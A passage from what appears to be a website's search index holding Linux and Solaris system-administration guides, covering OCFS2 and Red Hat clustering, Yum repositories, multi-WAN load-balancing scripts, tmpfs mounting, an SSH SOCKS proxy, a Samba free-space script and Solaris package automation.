                content: "Introduction linkOCFS2 is a cluster filesystem that allows sharing filesystems between multiple machines with fault tolerance.\nThis file system was initially created for Oracle databases and therefore has a locking mechanism designed for this type of application. You can use it as a file system, but the problem is that it may flush old locks after a certain period. If your idea is really to use a cluster filesystem to store files, it would be better to turn to GFS.\nInstallation linkBy default, OCFS2 is compiled as a module in the kernel. To ensure this, we can check the kernel config file:\ngrep OCFS2 /boot/config-`uname -r` which should return:\nCONFIG_OCFS2_FS=m CONFIG_OCFS2_DEBUG_MASKLOG=y Let’s install the necessary tools:\naptitude install ocfs2-tools Configuration linkcluster.conf linkAdd this to the /etc/ocfs2/cluster.conf file. Be careful, it’s very picky, so include only what is strictly necessary with tabs, etc., and no superfluous lines:\ncluster: node_count = 2 name = ocfs2_cluster node: ip_port = 7777 ip_address = 192.168.100.1 number = 0 name = zazu cluster = ocfs2_cluster node: ip_port = 7777 ip_address = 192.168.20.4 number = 1 name = shenzi cluster = ocfs2_cluster I don’t think I need to provide many explanations, as the configuration file is clear. But here are some just in case:\nnode_count: number of nodes in the cluster This configuration should be applied to all of your nodes.\no2cb linkNow let’s edit the OCFS2 startup file:\n# # This is a configuration file for automatic startup of the O2CB # driver. It is generated by running 'dpkg-reconfigure ocfs2-tools'. # Please use that method to modify this file. # # O2CB_ENABLED: 'true' means to load the driver on boot. O2CB_ENABLED=true # O2CB_BOOTCLUSTER: If not empty, the name of a cluster to start. O2CB_BOOTCLUSTER=ocfs2_cluster # O2CB_HEARTBEAT_THRESHOLD: Iterations before a node is considered dead. O2CB_HEARTBEAT_THRESHOLD=31 # O2CB_IDLE_TIMEOUT_MS: Time in ms before a network connection is considered dead. O2CB_IDLE_TIMEOUT_MS=30000 # O2CB_KEEPALIVE_DELAY_MS: Max. time in ms before a keepalive packet is sent. O2CB_KEEPALIVE_DELAY_MS=2000 # O2CB_RECONNECT_DELAY_MS: Min. time in ms between connection attempts. O2CB_RECONNECT_DELAY_MS=2000 You just need to modify O2CB_ENABLED and O2CB_BOOTCLUSTER, indicating the name of the OCFS2 cluster.\nStartup linkThere is a graphical tool for managing ocfs2, “ocfs2console”, but we won’t cover it here.\nTo properly start ocfs2 (necessary after each configuration change):\n/etc/init.d/o2cb offline ocfs2 /etc/init.d/o2cb unload /etc/init.d/o2cb load /etc/init.d/o2cb online ocfs2 For subsequent reboots:\n/etc/init.d/o2cb restart Formatting linkYou can now format the device you want with OCFS2 using the mkfs.ocfs2 command:\nmkfs.ocfs2 /dev/drbd0 Now just mount this on your nodes:\nmount.ocfs2 /dev/drbd0 /mnt Resources linkDocumentation on Heartbeat2 Xen cluster with drbd8 and OCFS2\n"
            }
        );
    index.add(
            {
                id:  352 ,
                href: "\/Yum_:_utilisation_des_packages_sous_RedHat\/",
                title: "Yum: Package Management in Red Hat",
                description: "A guide on using Yum package manager in Red Hat-based distributions, including installation, removal, updates, and other package management operations.",
                content: "Introduction linkYum, which stands for Yellow dog Updater Modified, is a package manager for Linux distributions like Fedora and Red Hat Enterprise Linux, created by Yellow Dog Linux.\nIt allows you to manage the installation and updating of software installed on a distribution. It’s a layer on top of RPM that handles downloads and dependencies, similar to Debian’s APT or Mandriva’s Urpmi.\nUsage link Installing a package: yum install Reinstalling a package: yum reinstall Installing a local RPM: yum localinstall Removing a package: yum remove Updating packages or a specific package: yum update Getting information about a package: yum info Installing a package group: yum groupinstall Viewing available packages (installed or not): yum list or\nyum list htt* Viewing available package groups: yum grouplist Viewing repositories: yum repolist Finding which package a file belongs to (equivalent of apt-file): yum provides or\nyum whatprovides Ignoring missing GPG key: yum ... --nogpg Listing all installed packages: yum list installed Forcing the protection of an rpm on a specific redhat version: yum protectbase Checking compatibility: yum verify Downloading packages only You will need the yum-downloadonly package first to have this option in yum:\nyum install yum-downloadonly Then to download the package:\nyum install -y postfix --downloadonly Viewing the contents of a package: rpm -qla or\nrepoquery -qla "
            }
        );
    index.add(
            {
                id:  353 ,
                href: "\/Installation_d%5C%27un_cluster_Red_Hat_4\/",
                title: "Installing a Red Hat 4 Cluster",
                description: "Step-by-step guide to installing and configuring a Red Hat Cluster Suite on Red Hat Enterprise Linux 4.",
                content: "To install Red Hat Enterprise with Cluster Suite, take CDs or DVD and boot from it.\nWe are going to see step by step the interesting components.\nLanguage link Set the English language and not French to have more verbose output during future problems. Keyboard link Keep the French keyboard Partitioning (do the same partitioning on all the cluster nodes) link Location Type Size LVM Name /boot ext3 128 MB NO LVM!!! LVM Group Full Size (space left) VolGroup00 / ext3 4096 MB racine /var ext3 4096 MB var /usr ext3 10240 MB usr /tmp ext3 2048 MB tmp swap 4096 MB swap /home ext3 Space left home List of packages installation link base base-x kde-desktop or gnome-desktop editors (only vim) mail-server (- spamassassin) development-tools compat-arch-development admin-tools (+ sysstem-boot-config) system-tools compat-arch-support After rebooting, install these packages from the cluster suite (cdrom/RedHat/RPMS). Warning: pay attention for SMP; if not SMP servers, do not install it, install other relative packages.\nccs cman cman-kernel-smp dlm dlm-kernel-smp fence gulm ipvsadm magma magma-plugins perl-Net-Telnet rgmanager system-config-cluster Or run this command directly:\nrpm -ivh --aid ccs-1.0.7-0.x86_64.rpm cman-1.0.11-0.x86_64.rpm cman-kernel-smp-2.6.9-45.2.x86_64.rpm dlm-kernel-smp-2.6.9-42.10.x86_64.rpm fence-1.32.25-1.x86_64.rpm gulm-1.0.7-0.x86_64.rpm ipvsadm-1.24-6.x86_64.rpm magma-1.0.6-0.x86_64.rpm magma-plugins-1.0.9-0.x86_64.rpm perl-Net-Telnet-3.03-3.noarch.rpm rgmanager-1.9.53-0.x86_64.rpm system-config-cluster-1.0.27-1.0.noarch.rpm dlm-1.0.1-1.x86_64.rpm A little update might not be so bad (optional):\nup2date -u Modify the /etc/hosts like this on each node:\n127.0.0.1 localhost.localdomain localhost 192.168.0.242 secondary.cluster.net secondary 192.168.0.241 primary.cluster.net primary Here is an example of the cluster.conf file in /etc/cluster:\n\u003c?xml version=\"1.0\"?\u003e "
            }
        );
    index.add(
            {
                id:  354 ,
                href: "\/ajouter-le-dvd-red-hat-comme-repository\/",
                title: "Adding Red Hat DVD as a Repository",
                description: "How to add a Red Hat DVD as a local or remote YUM repository for installing packages without internet access or subscription.",
                content: "Introduction linkYou don’t have a Red Hat subscription or simply no internet connection to connect to the NRH, yet you have the installation DVD that contains all the packages you need!\nHere’s how to add the DVD to the repository.\nConfiguration linkDVD linkCreate a file in /etc/yum.repos.d/redhatcd.repo\ncp /media/RHEL/media.repo /etc/yum.repos.d/redhatcd.repo And adapt it with this content:\n[InstallMedia] name=Red Hat Enterprise Linux 6.1 mediaid=1305068199.328169 metadata_expire=-1 gpgcheck=0 cost=500 baseurl=file:///media/RHEL/Server Now we’ll clear the cache:\nyum clean all That’s it, now you can use yum with your DVD.\nLocal Repository linkIf you want to use a local repository, copy the “Server” folder from the DVD to a local folder (for example /home/repo/Server).\nNow you need to install the createrepo-0.9.8-4.el6.noarch.rpm package (or another version), as well as all necessary dependencies:\nyum install createrepo Then run this command if you’re on Red Hat 6:\ncreaterepo -v /home/repo/Server Or this command if you’re on Red Hat 5:\ncreaterepo -d -s sha1 /home/repo/Server Then create a file /etc/yum.repos.d/local.repo\n[InstallMedia] name=Red Hat Enterprise Linux 6.1 mediaid=1305068199.328169 metadata_expire=-1 gpgcheck=0 cost=500 baseurl=file:///home/repo/Server/ enabled=1 You can check the list of repositories with the command:\nyum repolist Then before installing a package, run:\nyum clean all Remote Repository linkYou can install an httpd server, then put the “Server” folder from the DVD to use as a remote yum DVD repository. Here’s an example of client-side configuration:\n[dvd-base] name=Red Hat Enterprise Linux $releasever Beta - Base - $basearch - DVD baseurl=http://server/repositories/rhel/$releasever/$basearch/ enabled=1 gpgcheck=1 gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-beta,file:///etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release For the server part, it’s identical to the local configuration.\nFAQ link[Errno -3] Error performing checksum linkIf you get this kind of message:\nhttp://server/repositories/rhws/5Client/i386/repodata/primary.xml.gz: [Errno -3] Error performing checksum Trying other mirror. Error: failure: repodata/primary.xml.gz from dvd-base: [Errno 256] No more mirrors to try. It’s probably because you’re running the createrepo command without the necessary arguments for Red Hat 5. Brief explanation:\nBecause RPM packages for Red Hat Enterprise Linux 6 are compressed using the XZ lossless data compression format, and may also be signed using alternative (and stronger) hash algorithms such as SHA-256, it is not possible to run createrepo on Red Hat Enterprise Linux 5 to create the package metadata for Red Hat Enterprise Linux 6 packages. The createrepo command relies on rpm to open and inspect the packages, and rpm on Red Hat Enterprise Linux 5 is not able to open the improved Red Hat Enterprise Linux 6 RPM package format. Resources linkhttps://access.redhat.com/kb/docs/DOC-9744\nhttp://samixblog.blogspot.com/2011/11/yum-errno-3-error-performing-checksum.html\nhttp://nareshov.wordpress.com/2011/12/22/rpmbuild-behaviour-centos5-vs-centos6/\n"
            }
        );
    index.add(
            {
                id:  355 ,
                href: "\/Load_balancer_plusieurs_connections_WAN\/",
                title: "Load Balancing Multiple WAN Connections",
                description: "How to configure load balancing between multiple WAN connections on Linux using IP route tables and automatic failover mechanism",
                content: " Introduction linkIf one ISP Provider bandwidth is not enough for your needs, you can have multiple lines and load balance between them on Linux. This documentation has been done on Debian and works like a charm :-).\nIt contains 3 network interfaces:\nIs plugged in a special DMZ VLAN (eth0) The second is plugged on a dedicated VLANS to ISP1 Provider (eth1) The third is plugged on a dedicated VLANS to ISP2 Provider (eth2) Internet traffic is load balanced between the two Internet accesses. In the current configuration the weight assigned to ISP1 is 3 and ISP2 1 (it means that 3 times more traffic passes through ISP1 than ISP2).\nNetwork configuration linkTo do this, we are using the following configuration:\n# The loopback network interface auto lo iface lo inet loopback # The primary network interface allow-hotplug eth0 iface eth0 inet static address 172.16.0.51 netmask 255.255.255.240 broadcast 172.16.0.63 post-up route add -net 192.168.0.0/16 gw 172.16.0.49 post-up route add -net 172.16.0.0/16 gw 172.16.0.49 post-up route add -net 10.0.0.0/8 gw 172.16.0.49 # ISP1 allow-hotplug eth1 iface eth1 inet static address 192.168.1.2 netmask 255.255.255.0 gateway 192.168.1.1 # ISP2 allow-hotplug eth2 iface eth2 inet static address 192.168.2.2 netmask 255.255.255.0 Load Balancing configuration linkCreate the enable_balanced_routing script (/etc/network/if-up.d/enable_balanced_routing):\n#!/bin/bash # Enable load balancing between ISP1 \u0026 ISP2 # Enable routing on eth2 up test \"${IFACE}\" = 'eth2' || exit 0 function die() { echo \"$@\" \u003e\u00262 exit 1 } which ip \u003e/dev/null 2\u003e\u00261 || die \"Command not found, please install it\" which ipcalc \u003e/dev/null 2\u003e\u00261 || die \"Command not found, please install it\" LAN_IFACE='eth0' LAN_IFACE_IP=$(ip a s ${LAN_IFACE} | awk '($1==\"inet\") {gsub(\"/.*\", \"\", $2) ; print $2}') LAN_NET_IP=$(ipcalc -n $(ip a s ${LAN_IFACE} | awk '($1==\"inet\") {print $2}') | awk '($1==\"Network:\") {print $2}') INET1_IFACE='eth1' INET1_IFACE_IP=$(ip a s ${INET1_IFACE} | awk '($1==\"inet\") {gsub(\"/.*\", \"\", $2) ; print $2}') INET1_NET_IP=$(ipcalc -n $(ip a s ${INET1_IFACE} | awk '($1==\"inet\") {print $2}') | awk '($1==\"Network:\") {print $2}') INET1_GW='192.168.1.1' INET1_WEIGHT=1 INET2_IFACE=${IFACE} INET2_IFACE_IP=$(ip a s ${INET2_IFACE} | awk '($1==\"inet\") {gsub(\"/.*\", \"\", $2) ; print $2}') INET2_NET_IP=$(ipcalc -n $(ip a s ${INET2_IFACE} | awk '($1==\"inet\") {print $2}') | awk '($1==\"Network:\") {print $2}') INET2_GW='192.168.2.1' INET2_WEIGHT=3 # Create routes throught ours network in each tables ip route add ${LAN_NET_IP} dev ${LAN_IFACE} table 100 ip route add ${INET1_NET_IP} dev ${INET1_IFACE} src ${INET1_IFACE_IP} table 100 ip route add ${INET2_NET_IP} dev ${INET2_IFACE} table 100 ip route add 127.0.0.0/8 dev lo table 100 ip route add ${LAN_NET_IP} dev ${LAN_IFACE} table 200 ip route add ${INET1_NET_IP} dev ${INET1_IFACE} table 200 ip route add ${INET2_NET_IP} dev ${INET2_IFACE} src ${INET2_IFACE_IP} table 200 ip route add 127.0.0.0/8 dev lo table 200 # Create a default route per table ip route add default via ${INET1_GW} table 100 ip route add default via ${INET2_GW} table 200 # Assigning appropriate traffic from an interface to the corresponding table ip rule add from ${INET1_IFACE_IP} table 100 ip rule add from ${INET2_IFACE_IP} table 200 # Force some specific routes if needed # ip route add to x.x.x.x via ${INET1_GW} dev ${INET1_IFACE} # ip route add to x.x.x.x via ${INET1_GW} dev ${INET1_IFACE} # Replacing default route ip route del default ip route add default scope global nexthop via ${INET1_GW} dev ${INET1_IFACE} weight ${INET1_WEIGHT} nexthop via ${INET2_GW} dev ${INET2_IFACE} weight ${INET2_WEIGHT} ip route flush cached # If you're using ntop, you should restart it for new changes to take effect # /etc/init.d/ntop restart \u0026 Now let’s create the disable script (/etc/network/if-down.d/disable_balanced_routing):\n#!/bin/bash # Disable load balancing between ISP1 \u0026 ISP2 # Enable routing on eth2 down test \"${IFACE}\" = 'eth2' || exit 0 which ip \u003e/dev/null 2\u003e\u00261 || die \"Command not found, please install it\" which ipcalc \u003e/dev/null 2\u003e\u00261 || die \"Command not found, please install it\" LAN_IFACE='eth0' LAN_IFACE_IP=$(ip a s ${LAN_IFACE} | awk '($1==\"inet\") {gsub(\"/.*\", \"\", $2) ; print $2}') LAN_NET_IP=$(ipcalc -n $(ip a s ${LAN_IFACE} | awk '($1==\"inet\") {print $2}') | awk '($1==\"Network:\") {print $2}') INET1_IFACE='eth1' INET1_IFACE_IP=$(ip a s ${INET1_IFACE} | awk '($1==\"inet\") {gsub(\"/.*\", \"\", $2) ; print $2}') INET1_NET_IP=$(ipcalc -n $(ip a s ${INET1_IFACE} | awk '($1==\"inet\") {print $2}') | awk '($1==\"Network:\") {print $2}') INET1_GW='192.168.1.1' INET2_IFACE=${IFACE} INET2_IFACE_IP=$(ip a s ${INET2_IFACE} | awk '($1==\"inet\") {gsub(\"/.*\", \"\", $2) ; print $2}') INET2_NET_IP=$(ipcalc -n $(ip a s ${INET2_IFACE} | awk '($1==\"inet\") {print $2}') | awk '($1==\"Network:\") {print $2}') INET2_GW='192.168.2.1' ip route del default ip route add default via ${INET1_GW} ip route flush cached # Delete our network routes in each tables ip route del ${LAN_NET_IP} dev ${LAN_IFACE} table 100 ip route del ${INET1_NET_IP} dev ${INET1_IFACE} src ${INET1_IFACE_IP} table 100 ip route del ${INET2_NET_IP} dev ${INET2_IFACE} table 100 ip route del 127.0.0.0/8 dev lo table 100 ip route del ${LAN_NET_IP} dev ${LAN_IFACE} table 200 ip route del ${INET1_NET_IP} dev ${INET1_IFACE} table 200 ip route del ${INET2_NET_IP} dev ${INET2_IFACE} src ${INET2_IFACE_IP} table 200 ip route del 127.0.0.0/8 dev lo table 200 # Delete default routes in tables ip route del default via ${INET1_GW} table 100 ip route del default via ${INET2_GW} table 200 # Disable route traffic weight rules ip rule del from ${INET1_IFACE_IP} table 100 ip rule del from ${INET2_IFACE_IP} table 200 # Delete specific routes # ip route del to x.x.x.x via ${INET1_GW} dev ${INET1_IFACE} # ip route del to x.x.x.x via ${INET1_GW} dev ${INET1_IFACE} Add execute rights:\nchmod ug+rx /etc/network/if-up.d/enable_balanced_routing /etc/network/if-down.d/disable_balanced_routing Automatic failover linkSince the ISP2 Internet access is unstable, we are using a self-made script to check it, and disable traffic through this interface if needed. This script runs in the background, and is launched by this init script:\n#!/bin/sh -e ### BEGIN INIT INFO # Provides: check_isp_connectivity # Required-Start: $network # Required-Stop: $network # Default-Start: 3 # Default-Stop: 0 1 6 # Short-Description: Check freebox connectivity # Description: Check freebox connectivity ### END INIT INFO NAME='check_isp_connectivity' DAEMON='/usr/bin/check_isp_connectivity.sh' PATH=\"/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\" PIDFILE='/var/run/check_isp_connectivity.pid' [ -x \"${DAEMON}\" ] || exit 0 . /lib/lsb/init-functions case \"$1\" in start) echo \"Starting check_isp_connectivity\" start-stop-daemon --start --background --quiet --exec $DAEMON ;; stop) echo \"Stopping check_isp_connectivity\" start-stop-daemon --stop --quiet --pidfile ${PIDFILE} ;; status) status_of_proc \"$DAEMON\" \"$NAME\" \u0026\u0026 exit 0 || exit $? ;; *) echo \"Usage: /etc/init.d/check_isp_connectivity {start|stop}\" exit 1 ;; esac It needs to get a daemon that will check the connectivity:\n#!/bin/bash # Check that the ISP2 works fine, and, if this is not the case, suppress balanced routing # TODO : avoid multiple variable declaration between /etc/network/if-up.d/enable_balanced_routing and this script # Interval to check connectivity on ISPs check_interval=5 IFACE='eth2' HOST='www.google.fr' LOGFILE=\"/var/log/$(basename ${0/.sh/.log})\" PIDFILE=\"/var/run/$(basename ${0/.sh/.pid})\" INET1_IFACE='eth1' INET1_IFACE_IP=$(ip a s ${INET1_IFACE} | awk '($1==\"inet\") {gsub(\"/.*\", \"\", $2) ; print $2}') INET1_NET_IP=$(ipcalc -n $(ip a s ${INET1_IFACE} | awk '($1==\"inet\") {print $2}') | awk '($1==\"Network:\") {print $2}') INET1_GW='192.168.1.1' INET1_WEIGHT=1 INET2_IFACE=${IFACE} INET2_IFACE_IP=$(ip a s ${INET2_IFACE} | awk '($1==\"inet\") {gsub(\"/.*\", \"\", $2) ; print $2}') INET2_NET_IP=$(ipcalc -n $(ip a s ${INET2_IFACE} | awk '($1==\"inet\") {print $2}') | awk '($1==\"Network:\") {print $2}') INET2_GW='192.168.2.1' INET2_WEIGHT=3 DO_RUN=true # We catch SIGTERM signal to end this script properly trap do_stop 15 function die() { echo \"${@}\" \u003e\u00262 echo \"$(LANG=C date \"+%h %d %H:%M:%S\") : ${@}\" \u003e\u003e ${LOGFILE} exit 1 } function log() { echo \"$(LANG=C date \"+%h %d %H:%M:%S\") : ${@}\" \u003e\u003e ${LOGFILE} } function test_interface() { local test_ip=$(host -t A ${HOST} | awk '($2==\"has\" \u0026\u0026 $3==\"address\") {print $4}' | head -n 1) # if balanced routing is disabled if ! $(ip ro show | grep -Eq \"nexthop via ${INET2_GW}\"); then ip route add to ${test_ip} via ${INET2_GW} dev ${INET2_IFACE} if $(ping -W 1 -q -c 3 -I ${IFACE} ${test_ip} \u003e /dev/null 2\u003e\u00261); then enable_balanced_routing else log \"We cannot ping ${test_ip} and balanced routing is already disabled\" fi ip route del to ${test_ip} via ${INET2_GW} dev ${INET2_IFACE} # if balanced routing is enabled, and we cannot ping our test IP elif ! $(ping -W 1 -q -c 3 -I ${IFACE} ${test_ip} \u003e /dev/null 2\u003e\u00261); then log \"We cannot ping ${test_ip}. Doing a second check just to be sure ...\" # We double check if we cannot join our test IP if $(ping -W 1 -q -c 3 -I ${IFACE} ${test_ip} \u003e /dev/null 2\u003e\u00261); then log \"It's okay, I can ping ${test_ip} during the second test\" else disable_balanced_routing fi fi } function disable_balanced_routing() { log \"Disabling balanced routing\" ip route del default ip route add default via ${INET1_GW} ip route flush cached } function enable_balanced_routing() { log \"Enabling balanced routing\" ip route del default ip route add default scope global nexthop via ${INET1_GW} dev ${INET1_IFACE} weight ${INET1_WEIGHT} nexthop via ${INET2_GW} dev ${INET2_IFACE} weight ${INET2_WEIGHT} ip route flush cached } function pid_managment() { local my_pid=$$ local old_pid if [ -f ${PIDFILE} ]; then old_pid=$(\u003c${PIDFILE}) ps --no-headers --pid ${old_pid} \u003e/dev/null \u0026\u0026 die \"Deamon is already up and running\" fi echo ${my_pid} \u003e ${PIDFILE} } function do_stop() { log \"${0} is stopping...\" DO_RUN=false } log \"${0} is starting...\" pid_managment # Launch check every x seconds while ${DO_RUN}; do if $(ip link show ${IFACE} | grep -q UP); then test_interface fi sleep $check_interval done log \"${0} is stopped\" Then we’ll set good rights and auto start on boot:\nchmod 754 /usr/bin/check_isp_connectivity.sh /etc/init.d/check_isp_connectivity update-rc.d defaults check_isp_connectivity Resources linkLoad_balancer_linux.txt\n"
            }
        );
    index.add(
            {
                id:  356 ,
                href: "\/Tmpfs_:_monter_un_filesystem_en_RAM_sous_Solaris\/",
                title: "Tmpfs: Mounting a RAM filesystem on Solaris",
                description: "A guide on how to set up and manage tmpfs on Solaris systems to create temporary filesystems in RAM",
                content: "Introduction linkTmpFS (Temporary File System) is the generic name given to any temporary Unix file system. Any file created in such a filesystem disappears when the system is shut down.\nThe default implementation of tmpfs in Linux 2.6.x kernels is based on ramfs, which uses the caching mechanism to optimize memory management. It is also available on Solaris 10.\nHowever, tmpfs additionally offers a memory size limit that is set at mount time and can be modified on-the-fly with the “remount” option for security purposes. Tmpfs also allows the system to use swap space when necessary, which provides an additional guarantee.\nUnlike a RAM Disk, it allocates memory dynamically to avoid excessive usage and offers better performance due to its extreme simplicity.\nUsage linkPrerequisites linkWe will create a mount point at /media/montmpfs.\nFirst, create the directory:\nmkdir -p /media/montmpfs Then change the permissions on this directory so everyone can read/write/execute:\nchmod 777 /media/montmpfs Mounting linkOnce the prerequisites are completed, we can mount the partition:\nmount -F tmpfs -o size=2048m swap /media/montmpfs -o size=2048m: specify the desired size. If none is defined, it will be the size of RAM + swap. /media/montmpfs: mount point for tmpfs To have this mount persist across reboots, add it to the vfstab file (/etc/vfstab):\n... swap - /media/montmpfs tmpfs - yes size=2048m ... Expanding the Partition linkYou didn’t plan enough space for your partition? We can expand it - it’s not simple, but it’s feasible.\nWARNING: Performing this operation in production can be very risky\nRetrieving Information linkFirst, let’s check the available space:\n\u003e df -h /media/montmpfs Filesystem size used avail capacity Mounted on swap 2,0G 272K 2,0G 1% /media/montmpfs Let’s retrieve the memory address used for our tmpfs:\n\u003e echo \"::fsinfo\" | mdb -k | egrep \"VFSP|/media/montmpfs\" VFSP FS MOUNT ffffffffbd1e10c0 tmpfs /media/montmpfs Here’s the allocation address: ffffffffbd1e10c0.\nNow, let’s retrieve the address of the tm_anonmax variable so we can change its value later:\n\u003e echo \"ffffffffbd1e10c0::print vfs_t vfs_data | ::print -ta struct tmount tm_anonmax\" | mdb -k ffffffffbfb42068 ulong_t tm_anonmax = 0x80000 Here tm_anonmax (number of pages) is equal to 0x80000 (512kb) at memory address ffffffffbfb42068.\nApplying the New Value linkWe will now change its value. Let’s say we want to increase it to 3GB. First, we need to retrieve the default block size allocated for swap:\n\u003e pagesize 4096 So I have 4kb blocks.\nIf I want to change to 3GB, I need to calculate the value in hexadecimal:\nDesired size =\u003e desired size in kb / block size in kb = size in Kb = size in hexadecimal 3G =\u003e 3145728Kb / 4kb = 786432Kb = 0xC0000 Now let’s use these values and apply them to the current memory address to expand it:\n\u003e echo \"ffffffffbfb42068/Z 0xC0000\" | mdb -kw 0x3000f488d00: 0x80000 = 0xC0000 Let’s verify that our changes were applied correctly:\n\u003e echo \"ffffffffbfb42068/J\" | mdb -k 0x3000f488d00: 0xC0000 or\n\u003e echo \"ffffffffbfb42068::print vfs_t vfs_data | ::print struct tmount tm_anonmax\" | mdb -k tm_anonmax = 0xC0000 And check the result:\n\u003e df -h /media/montmpfs Filesystem size used avail capacity Mounted on swap 3,0G 272K 3,0G 1% /media/montmpfs Resources linkhttp://docs.oracle.com/cd/E19963-01/html/821-1459/fscreate-99040.html http://ilapstech.blogspot.com/2009/11/grow-tmp-filesystem-tmpfs-on-line-under.html Solaris Tmpfs documentation\n"
            }
        );
    index.add(
            {
                id:  357 ,
                href: "\/Tmpfs_:_un_filesystem_en_ram_ou_comment_%C3%A9crire_en_ram\/",
                title: "Tmpfs: RAM filesystem or how to write to RAM",
                description: "A guide on how to create and use a temporary filesystem in RAM for fast access and temporary storage",
                content: "Introduction linkTmpFS (Temporary File System) is the generic name given to any temporary Unix filesystem. Any file created in such a filesystem disappears when the system shuts down.\nThe default implementation of tmpfs in Linux 2.6.x kernels is based on ramfs which uses the caching mechanism to optimize memory management.\nIt is also available on Solaris 10.\nHowever, for security reasons, tmpfs additionally offers a memory size limit set at mount time that can be changed on-the-fly with the “remount” option. Tmpfs also allows the system to use swap when necessary, which provides an additional guarantee.\nUnlike a RAM Disk, it dynamically allocates memory so as not to use it excessively, and offers better performance thanks to its extreme simplicity.\nUsage linkPrerequisites linkWe will create a mount point on /media/montmpfs.\nFirst, we need to create the directory:\nmkdir -p /media/montmpfs Then, if necessary, change the permissions on this directory so that everyone can read/write/execute:\nchmod 777 /media/montmpfs Mounting linkFinally, a tmpfs is mounted like all mount points in Linux, with the mount command.\nmount -t tmpfs -o size=256M tmpfs /media/montmpfs The options are:\n-t: to specify the file type -o: for options, including size (if not specified, the default size is equal to half of the RAM) then the device, here tmpfs or none (personally I use tmpfs, because with the df command it’s listed as tmpfs as the Filesystem) then the mount point. To mount it automatically at startup, you need to edit the /etc/fstab file.\nExample of a line to add:\ntmpfs /tmp tmpfs defaults,size=1g 0 0 Resources linkStoring Files Directories In Memory With tmpfs\nhttp://www.generation-linux.fr/index.php?post/2009/05/04/tmpfs-%3A-utiliser-sa-ram-comme-repertoire-de-stockage\n"
            }
        );
    index.add(
            {
                id:  358 ,
                href: "\/OpenSSH_:_Cr%C3%A9er_un_proxy_socks_en_SSH\/",
                title: "OpenSSH: Creating an SSH SOCKS Proxy",
                description: "Learn how to create a SOCKS proxy using SSH to securely route your traffic through an encrypted tunnel.",
                content: " Introduction linkThis tutorial will be brief, but it’s highly effective. The utility of creating a SOCKS proxy via SSH is to be able to route any traffic through an external connection once the SSH connection is established. You simply use the proxy that SSH creates and you’re ready to go.\nWith SSLH as a frontend, you have an almost ultimate tool.\nFor more advanced techniques, I also recommend checking out the documentation on proxychains.\nUsage linkTo establish an SSH connection while opening a SOCKS proxy, simply run this command from server A:\nssh -D @ For example:\nssh -D 12345 user@serverB Once the connection is established, configure your web browser or other applications to use localhost as a SOCKS proxy on the specified port (in this case 12345).\n"
            }
        );
    index.add(
            {
                id:  359 ,
                href: "\/trick-samba-share-size-display\/",
                title: "Trick Samba Share Size Display",
                description: "How to modify the displayed available space on a Samba share to overcome space limitations with nested mount points",
                content: "Introduction linkA colleague of mine found himself in a rather delicate situation. Let me explain the scenario:\n2 mount points in /mnt, with one nested inside the other 1 share on the primary mount point When the primary mount point is full, you can’t copy anything anymore, even if the second nested mount point still has free space. For those who still don’t understand:\n/mnt/: 30 MB remaining /mnt/disk1: 10 GB remaining share: /mnt/ The share tells me that it can’t copy more than 30 MB, even into /share/disk1.\nSolution linkHere is a solution that allows you to bypass the fact that Windows will analyze the remaining size of the shared folder before copying what you want. In the Samba configuration file, adjust your share like this:\n... [Share] comment = Share file space path = /mnt/shares/Share read only = no public = yes guest ok = yes dfree command = /etc/samba/dfree dfree cache time = 3600 vfs objects = recycle create mask = 0775 directory mask = 0775 #force user = nobody #force group = Team recycle:exclude = *.tmp *.temp *.o *.obj ~$* recycle:exclude = *.tmp *.temp *.o *.obj ~$* recycle:keeptree = True recycle:touch = True recycle:versions = True recycle:noversions = .doc|.xls|.ppt recycle:repository = .recycle recycle:maxsize = 0 admin users = @admins inherit permissions = Yes #case sensitive = no #preserve case = yes ... dfree is the argument needed for the Samba daemon to determine the size to display for a given share at startup:\n#!/usr/bin/env bash df -Pk $1 | tail -1 | awk '{print $2\" \"$4}' Then apply the proper permissions:\nchmod 700 /etc/samba/dfree References linkhttps://www.samba.org/samba/docs/man/manpages-3/smb.conf.5.html\n"
            }
        );
    index.add(
            {
                id:  360 ,
                href: "\/Automatiser_l\u0027installation_de_beaucoup_de_packages\/",
                title: "Automating Installation of Many Packages",
                description: "Learn how to automate the installation of numerous packages on Solaris systems using response and admin files.",
                content: "Introduction linkPkgadd isn’t particularly user-friendly; it has plenty of options but they’re a bit too hidden for my taste. For work, I needed to deploy approximately 1000 packages on several machines. However, with each package installation, I had to enter ‘y’ and press enter, which quickly becomes tedious.\nTo solve this problem, I looked at the man page and found the -n argument, which is useful since it lets you bypass interactive mode. The drawback is that it doesn’t work perfectly. So I searched a bit on the internet and found the response file. This is a file where we pass options. These options are tested during a package installation, and here we force them by default to avoid being bothered.\nNote: there’s also the pkgask command that allows you to create a response file, but it seems to have some limitations compared to this method.\nIMPORTANT: This doesn’t work for .pkg files! Convert them beforehand.\nConfiguration linkResponse File linkA response file can be generated using the pkgask command:\npkgask -r /answer -d . This will generate a response file called “answer”. This file contains options specific to the package and cannot be used by any other package.\nWhen trying to generate a response file, the command might return this:\npkgask: ERROR: package does not contain an interactive request script Processing of request script failed. No changes were made to the system. This indicates that the package doesn’t contain any customization information, and in this case, using an admin file is necessary.\nAdmin File linkNot all packages allow the use of a response file, which is why we can also use an admin file. The admin file works the same way as the response file but uses standard options for a package installation rather than custom options specific to the package.\nA template admin file can be found in the directory /var/sadm/install/admin/default. Copy it, then modify it to meet your needs.\nHere’s what an admin file looks like:\n# /answer mail= instance=overwrite partial=nocheck runlevel=nocheck idepend=nocheck rdepend=nocheck space=nocheck setuid=nocheck conflict=nocheck action=nocheck networktimeout=60 networkretries=3 authentication=quit keystore=/var/sadm/security proxy= basedir=default WARNING: If you want to use this method to install packages in the “Finish” script of a jumpstart, don’t forget to modify the parameter “basedir=default” to “basedir=/a/” which corresponds to the mount point of the partition during installation.\nInstallation Script linkYou can simply navigate to the folder in question and execute pkgadd:\nWith a response file pkgadd -n -r /answer -d . * With an admin file pkgadd -n -a /answer -d . * You must specify the full paths when using the response file!\nAlternatively, you can use this script (I prefer it, but it’s up to you):\nWith a response file for i in *; do test -d /export/home/packages_migration/$i \u0026\u0026 pkgadd -n -r /answer -d . $i done With an admin file for i in *; do test -d /export/home/packages_migration/$i \u0026\u0026 pkgadd -n -a /answer -d . $i done Run this and you’ll be set!\nResources 